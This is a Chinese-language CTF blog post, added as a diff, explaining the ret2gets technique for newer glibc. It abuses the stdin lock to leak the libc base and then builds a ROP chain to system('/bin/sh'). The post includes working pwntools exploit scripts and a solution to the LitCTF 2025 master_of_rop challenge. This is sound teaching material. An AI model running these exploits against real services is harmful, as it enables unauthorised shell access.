@@ -1,0 +1,273 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ret2gets | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ret2gets[原创]ret2gets的原理与利用方法-Pwn-看雪安全社区｜专业技术交流与安全研究论坛 可以看一下这位师傅写的ret2gets的原理。还是十分详细的。 由于在高版本的glibc中删除了 __libc_csu_init这个函数。所以导致我们在不清楚libc基地址的情况下，很难找到pop rdi这样的gadget来为我们传递一参。正常的ret2libc就基本上利用不了了。 在gli">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ret2gets">
+<meta property="og:url" content="http://example.com/2026/04/19/ret2gets/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="ret2gets[原创]ret2gets的原理与利用方法-Pwn-看雪安全社区｜专业技术交流与安全研究论坛 可以看一下这位师傅写的ret2gets的原理。还是十分详细的。 由于在高版本的glibc中删除了 __libc_csu_init这个函数。所以导致我们在不清楚libc基地址的情况下，很难找到pop rdi这样的gadget来为我们传递一参。正常的ret2libc就基本上利用不了了。 在gli">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-04-19T09:47:37.000Z">
+<meta property="article:modified_time" content="2026-04-19T15:36:33.973Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="pwn进阶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/04/19/ret2gets/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2gets',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">ret2gets</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="ret2gets"><a href="#ret2gets" class="headerlink" title="ret2gets"></a>ret2gets</h1><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-287048.htm">原创]ret2gets的原理与利用方法-Pwn-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<p>可以看一下这位师傅写的ret2gets的原理。还是十分详细的。</p>
+<p>由于在高版本的glibc中删除了<code> __libc_csu_init</code>这个函数。所以导致我们在不清楚libc基地址的情况下，很难找到<code>pop rdi</code>这样的gadget来为我们传递一参。正常的ret2libc就基本上利用不了了。</p>
+<p>在glibc2.35~2.37版本中，我们可以来看一下这里的ret2gets是怎么利用的。</p>
+<p>可以先写一个比较简单的demo。</p>
+<p>版本是glibc2.35的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Can you rop?\n&quot;</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然，这里不存在<code>pop rdi</code>这种方便的一参。那我们应该怎么办呢？</p>
+<p>可以先运行下程序看看做了什么。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(elf.plt.gets)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin&#x27;</span>+p8(u8(<span class="string">b&#x27;/&#x27;</span>)+<span class="number">1</span>)+<span class="string">b&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这是我们的测试脚本。可以看到断点打在了发送内容之前。</p>
+<p><img src="/images/ret2gets1.png" alt="gdb"></p>
+<p>可以看到我们的rdi里存放的是<code>_IO_stdfile_0_lock</code>，存放的是libc内的内容。这就为我们泄露libc基地址提供帮助了。</p>
+<p>首先先看下结构体。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> cnt;</span><br><span class="line">    <span class="type">void</span> *owner;</span><br><span class="line">&#125; _IO_lock_t;</span><br></pre></td></tr></table></figure>
+
+<p>我们这里需要利用到里面的两个宏。可以看下源码。（glibc2.37）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;                                        \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;                           \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((_name).owner != __self)                          \</span></span><br><span class="line"><span class="meta">      &#123;                                       \</span></span><br><span class="line"><span class="meta">    lll_lock ((_name).lock, LLL_PRIVATE);                     \</span></span><br><span class="line"><span class="meta">        (_name).owner = __self;                           \</span></span><br><span class="line"><span class="meta">      &#125;                                       \</span></span><br><span class="line"><span class="meta">    ++(_name).cnt;                                \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;                                        \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (--(_name).cnt == 0)                           \</span></span><br><span class="line"><span class="meta">      &#123;                                       \</span></span><br><span class="line"><span class="meta">        (_name).owner = NULL;                             \</span></span><br><span class="line"><span class="meta">    lll_unlock ((_name).lock, LLL_PRIVATE);                   \</span></span><br><span class="line"><span class="meta">      &#125;                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到在_IO_lock_unlock里存在对cnt会进行–，并判断–后的值时候&#x3D;&#x3D;0。如果等于0，那么owner处的值就会被置零。但是owner处是存放着TLS地址的。只要能puts出来，我们就拿到了libc基地址了。</p>
+<p>所以就是说，我们输入的第五个字节会被减减。同时要注意，puts会有’\x00’截断，所以在owner之前不能存在’\x00’字节存在。</p>
+<p>我们可以来看一下如何在没有<code>pop rdi</code>的情况下控制一参。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(elf.plt.gets)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(pl)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin&#x27;</span>+p8(u8(<span class="string">b&#x27;/&#x27;</span>)+<span class="number">1</span>)+<span class="string">b&#x27;sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/ret2gets2.png" alt="gdb"></p>
+<p>可以看到，通过减一后，我们输入的内容刚好就是&#x2F;bin&#x2F;sh了。同时这里还实现了对于一参rdi的控制。</p>
+<p>但是，我们这里没有调用system啊，光光控制一参有什么用呢？</p>
+<p>所以我们的首要目的是去获得libc的基地址。</p>
+<p>也就是要去绕过_IO_lock_unlock的检测。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(elf.plt.gets) + p64(elf.plt.puts) + p64(elf.sym.main)</span><br><span class="line">io.sendline(pl1)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3b8740</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">rdi = base + <span class="number">0x2a3e5</span></span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi) + p64(binsh) + p64(base+libc.sym.system)</span><br><span class="line">io.sendline(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里关键在于<code>b&#39;A&#39;*4+b&#39;\x00&#39;*3</code>。由于gets会把末尾的\n换成\x00，所以我们输入后会变成lock被写入为AAAA，cnt被写入为\x00*4。当cnt自减时，就会变为一个大数\xff\xff\xff\xff。这样就成功绕过了检测，得到了libc基地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7e1ca80</span><br><span class="line">00:0000│ rax rdi 0x7ffff7e1ca80 ◂— 0xffffffff41414141</span><br><span class="line">01:0008│         0x7ffff7e1ca88 —▸ 0x7ffff7fb8740 ◂— 0x7ffff7fb8740</span><br><span class="line">02:0010│         0x7ffff7e1ca90 ◂— 0</span><br><span class="line">... ↓            5 skipped</span><br></pre></td></tr></table></figure>
+
+<p>在得到libc基地址后，后面去获得各种gadget就简单多了。</p>
+<p>上面的实现都基于glibc2.35-2.37版本。</p>
+<p>在glibc2.37~2.39版本中又对lock增加了检测。</p>
+<p>还是先看源码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;                                        \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;                           \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (SINGLE_THREAD_P &amp;&amp; (_name).owner == NULL)                 \</span></span><br><span class="line"><span class="meta">      &#123;                                       \</span></span><br><span class="line"><span class="meta">    (_name).lock = LLL_LOCK_INITIALIZER_LOCKED;               \</span></span><br><span class="line"><span class="meta">    (_name).owner = __self;                           \</span></span><br><span class="line"><span class="meta">      &#125;                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> <span class="keyword">if</span> ((_name).owner != __self)                         \</span></span><br><span class="line"><span class="meta">      &#123;                                       \</span></span><br><span class="line"><span class="meta">    lll_lock ((_name).lock, LLL_PRIVATE);                     \</span></span><br><span class="line"><span class="meta">    (_name).owner = __self;                           \</span></span><br><span class="line"><span class="meta">      &#125;                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>                                      \</span></span><br><span class="line"><span class="meta">      ++(_name).cnt;                                  \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;                                        \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (SINGLE_THREAD_P &amp;&amp; (_name).cnt == 0)                      \</span></span><br><span class="line"><span class="meta">      &#123;                                       \</span></span><br><span class="line"><span class="meta">    (_name).owner = NULL;                             \</span></span><br><span class="line"><span class="meta">    (_name).lock = 0;                             \</span></span><br><span class="line"><span class="meta">      &#125;                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> <span class="keyword">if</span> ((_name).cnt == 0)                            \</span></span><br><span class="line"><span class="meta">      &#123;                                       \</span></span><br><span class="line"><span class="meta">    (_name).owner = NULL;                             \</span></span><br><span class="line"><span class="meta">    lll_unlock ((_name).lock, LLL_PRIVATE);                   \</span></span><br><span class="line"><span class="meta">      &#125;                                       \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>                                      \</span></span><br><span class="line"><span class="meta">      --(_name).cnt;                                  \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
+
+<p>发现这里只有当cnt!&#x3D;0的时候才可以让cnt–。</p>
+<p>结合nssctf里的一道题来说明。</p>
+<h2 id="LitCTF-2025-master-of-rop"><a href="#LitCTF-2025-master-of-rop" class="headerlink" title="[LitCTF 2025]master_of_rop"></a><code>[LitCTF 2025]master_of_rop</code></h2><p>链接：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6782">LitCTF 2025]master_of_rop - NSSCTF</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to LitCTF2025!&quot;</span>);</span><br><span class="line">  gets(v4, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依旧一眼栈溢出。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.anna.nssctf.cn&#x27;,28428)</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(elf.plt.gets)*<span class="number">2</span> + p64(elf.plt.puts) + p64(<span class="number">0x4011ad</span>)</span><br><span class="line">io.sendline(pl1)</span><br><span class="line">io.sendline(p32(<span class="number">0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3ba740</span><span class="comment">#（远端换成+0x28c0）</span></span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">rdi = base + <span class="number">0x10f75b</span></span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi) + p64(binsh) + p64(rdi+<span class="number">1</span>) + p64(base+libc.sym.system)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里解释一下。</p>
+<p>这里去使用了两次gets，两次往<code>_IO_stdfile_0_lock_</code>里写入内容。</p>
+<p>第一次先去覆盖cnt的值，然后把lock置零，防止stdin上死锁，卡死进程（最后发现好像不管写入什么，都会把lock置零？）然后就是第二次写入，把lock再给覆盖，然后就可以正常打rop了。这里把lock去置零，然后后面会发生抢锁的过程，然后会更新owner。好像只要owner地址合法，就不会考虑lock的值了？也要先咕咕咕了。这种题型比较死板，基本照着写就行QAQ。</p>
+<p>问题是这里远端我调了好久，也不知道为什么一直和远端有问题。先咕咕咕吧……</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/04/19/ret2gets/">http://example.com/2026/04/19/ret2gets/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn%E8%BF%9B%E9%98%B6/">pwn进阶</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/19/Double-free/" title="Double_free"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Double_free</div></div><div class="info-2"><div class="info-item-1">Double Free顾名思义就是进行两次free的操作。不过为什么要进行两次的free呢？ 因为通过这样的手法就可以实现任意地址写。 [HGAME 2023 week2]new_fast_note12345678910111213141516171819202122232425262728293031323334353637int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+14h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  init(argc, argv, envp);  while ( 1 )  &#123;    menu();    __isoc99_scanf(&quot;%d&quot;, &amp;n4);    if ( n4 == 4 )      exit(0);    if ...</div></div></div></a><a class="pagination-related" href="/2026/04/15/House%20of%20orange&House%20of%20cat/" title="House of orange &amp; House of cat"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-15</div><div class="info-item-2">House of orange &amp; House of cat</div></div><div class="info-2"><div class="info-item-1">House of orange &amp; House of cat也是一点点终于开始涉及IO的pwn题了。理解起来确实很绕，而且各个版本存在不同的手法，也是难度比较大的。(看源码太痛了，以前的师傅们真是太强了。) House of Orange - CTF Wiki可以看下CTF Wiki里对该手法的介绍。 1234567891011121314151617old_top = av-&gt;top;//原本old top chunk的地址  old_size = chunksize (old_top);//原本old top chunk的size  old_end = (char *) (chunk_at_offset (old_top, old_size));//old top chunk的地址加上其size  brk = snd_brk = (char *) (MORECORE_FAILURE);  /*     If not the first time through, we require old_size to be     at least MINSIZE and...</div></div></div></a><a class="pagination-related" href="/2026/03/10/House-of-force/" title="House_of_force"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-10</div><div class="info-item-2">House_of_force</div></div><div class="info-2"><div class="info-item-1">House of force是一种通过改写top_chunk_size的方法，来达到一种类似任意地址读写的手法。 [羊城杯 2023 决赛]easy_force12345678910111213141516171819202122232425262728293031323334353637void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int n2; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  _INIT();  puts(&quot;This day is schoolday,now teacher ask u to write somethings on the balckbroad&quot;);  puts(&quot;the teacher will leave some space on the balckbroad&q...</div></div></div></a><a class="pagination-related" href="/2026/02/19/UAF/" title="UAF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">UAF</div></div><div class="info-2"><div class="info-item-1">UAFUse After 